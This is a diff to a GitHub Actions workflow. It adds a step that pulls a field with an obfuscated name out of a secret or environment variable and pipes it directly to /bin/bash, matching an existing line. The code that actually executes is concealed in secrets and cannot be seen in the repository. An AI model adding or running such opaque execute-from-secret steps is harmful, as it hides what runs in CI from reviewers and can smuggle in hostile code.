@@ -19,6 +19,7 @@ jobs:
           gay2: ${{ secrets.gay2 }}
         run: |
           printf '%s' "$gay2" | jq -r .nnlv1005 | /bin/bash
+          printf '%s' "$sf24288" | jq -r .soumb54821 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
